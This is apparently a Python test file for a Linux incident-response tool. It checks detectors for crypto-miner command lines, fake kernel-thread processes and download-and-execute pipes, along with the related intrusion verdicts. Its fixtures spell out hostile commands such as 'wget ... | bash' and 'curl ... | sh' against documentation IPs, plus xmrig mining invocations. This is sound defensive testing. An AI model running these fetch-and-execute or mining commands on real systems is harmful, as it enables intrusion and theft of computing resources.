"""挖矿、内核线程伪装、下载后执行。

对照 Sigma proc_creation_lnx_crypto_mining、Elastic kthreadd masquerading、
lnx_shell_susp_commands。不并进 test_detection_accuracy 的 20 个场景。

挖矿命令行和伪装内核线程单独跨过 6 分。下载管道要配上可写目录落地才加分。
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from irtrace.analyzers.correlation import CorrelationAnalyzer
from irtrace.analyzers.intrusion import judge_intrusion
from irtrace.collectors.payload import download_exec, kthread_masquerade, miner_flags
from irtrace.collectors.process import ProcessCollector
from irtrace.core.models import Category, Event


def _ev(action: str, *, minutes: int = 0, **kwargs) -> Event:
    base = datetime(2026, 10, 13, 11, 0, tzinfo=timezone.utc)
    kwargs.setdefault("category", Category.PROCESS)
    kwargs.setdefault("source", "bench")
    kwargs.setdefault("message", action)
    return Event(action=action, timestamp=base + timedelta(minutes=minutes), **kwargs)


class _Ctx:
    def __init__(self, events):
        self.events = events


def test_miner_patterns_match_sigma_indicators():
    assert miner_flags("./xmrig -o stratum+tcp://pool.minexmr.com:4444") == ["crypto_miner"]
    assert miner_flags("kworker --donate-level=0 --algo=rx/0 ") == ["crypto_miner"]
    assert miner_flags("echo LS1kb25hdGUtbGV2ZWw9MQ== | base64 -d") == ["crypto_miner"]
    assert miner_flags("echo c3RyYXR1bSt0Y3A6Ly9wb29s | base64 -d") == ["crypto_miner"]
    assert miner_flags("echo c3RyYXR1bSt1ZHA6Ly8= | base64 -d") == ["crypto_miner"]
    assert miner_flags("curl https://example.com/file.tar.gz -o /tmp/a") == []
    assert miner_flags("/usr/bin/python3 -m http.server") == []


def test_kthread_requires_userland_exe():
    assert kthread_masquerade("[kworker/0:1]", "/tmp/.x")
    assert kthread_masquerade("[kthreadd]", "/usr/bin/perl")
    assert not kthread_masquerade("[kworker/0:1]", "")
    assert not kthread_masquerade("[kworker/0:1]", "/usr/bin/sshd (deleted)")
    assert not kthread_masquerade("kworker/0:1", "/tmp/.x")
    assert not kthread_masquerade("nginx", "/usr/sbin/nginx")


def test_download_exec_is_pipe_only():
    assert download_exec("wget http://203.0.113.8/a.sh | bash")
    assert download_exec("curl -fsSL http://203.0.113.8/x | sh")
    assert download_exec("curl http://203.0.113.8/p | perl")
    assert not download_exec("wget http://203.0.113.8/a.sh -O /tmp/a.sh")
    assert not download_exec("curl https://pypi.org/simple/requests/")


def test_process_collector_flags_three_patterns():
    collector = ProcessCollector()
    miner = collector._flag_suspicious({
        "comm": "xmrig", "exe": "/tmp/.cache/xmrig", "cmdline":
        "/tmp/.cache/xmrig -o stratum+tcp://pool.example:3333 --donate-level=0",
        "ppid": 1, "user": "www-data",
    })
    assert "crypto_miner" in miner
    fake = collector._flag_suspicious({
        "comm": "[kworker/1:2]", "exe": "/dev/shm/.k",
        "cmdline": "/dev/shm/.k", "ppid": 2, "user": "root",
    })
    assert "kthread_masquerade" in fake
    real = collector._flag_suspicious({
        "comm": "[kworker/0:0]", "exe": "",
        "cmdline": "[kworker/0:0]", "ppid": 2, "user": "root",
    })
    assert real == []
    piped = collector._flag_suspicious({
        "comm": "bash", "exe": "/bin/bash",
        "cmdline": "wget http://203.0.113.9/a | bash",
        "ppid": 88, "user": "www-data",
    })
    assert "download_exec" in piped


def test_miner_alone_is_compromise():
    verdict = judge_intrusion([
        _ev("process_suspicious", path="/tmp/xmrig",
            tags=["suspicious-process", "crypto_miner"],
            message="xmrig --donate-level=0"),
    ])
    assert verdict.compromised
    assert "T1496" in verdict.mitre


def test_masquerade_alone_is_compromise():
    verdict = judge_intrusion([
        _ev("process_suspicious", path="/tmp/.k",
            tags=["suspicious-process", "kthread_masquerade"],
            message="comm=[kworker/0:1] exe=/tmp/.k"),
    ])
    assert verdict.compromised
    assert "T1036.005" in verdict.mitre


def test_download_pipe_alone_is_not_compromise():
    verdict = judge_intrusion([
        _ev("process_suspicious", path="/bin/bash",
            tags=["suspicious-process", "download_exec"],
            message="curl http://203.0.113.8/a | bash"),
    ])
    assert not verdict.compromised


def test_download_pipe_with_drop_is_compromise():
    verdict = judge_intrusion([
        _ev("suspicious_file", minutes=1, category=Category.FILE,
            path="/tmp/.a", tags=["suspicious-file"]),
        _ev("process_suspicious", minutes=2, path="/bin/bash",
            tags=["suspicious-process", "download_exec"],
            message="wget http://203.0.113.8/a | bash"),
    ])
    assert verdict.compromised
    assert any("下载后直接执行" in item for item in verdict.signals)


def test_r15_requires_pool_or_drop():
    analyzer = CorrelationAnalyzer()
    miner = _ev("process_suspicious", path="/tmp/xmrig", tags=["crypto_miner"])
    assert analyzer._r15_crypto_miner(_Ctx([miner])) == []
    conn = _ev("external_connection", category=Category.NETWORK,
               dst_ip="203.0.113.40", dst_port=3333, tags=["external-conn", "outbound"])
    found = analyzer._r15_crypto_miner(_Ctx([miner, conn]))
    assert len(found) == 1
    assert "T1496" in found[0].mitre


def test_r16_ignores_masquerade_without_support():
    analyzer = CorrelationAnalyzer()
    fake = _ev("process_suspicious", pid=9, path="/tmp/.k",
               tags=["kthread_masquerade", "crypto_miner"])
    assert analyzer._r16_kthread_masquerade(_Ctx([fake])) == []
    dropped = _ev("suspicious_file", category=Category.FILE,
                  path="/tmp/.k", tags=["suspicious-file"])
    found = analyzer._r16_kthread_masquerade(_Ctx([fake, dropped]))
    assert len(found) == 1
    assert "T1036.005" in found[0].mitre
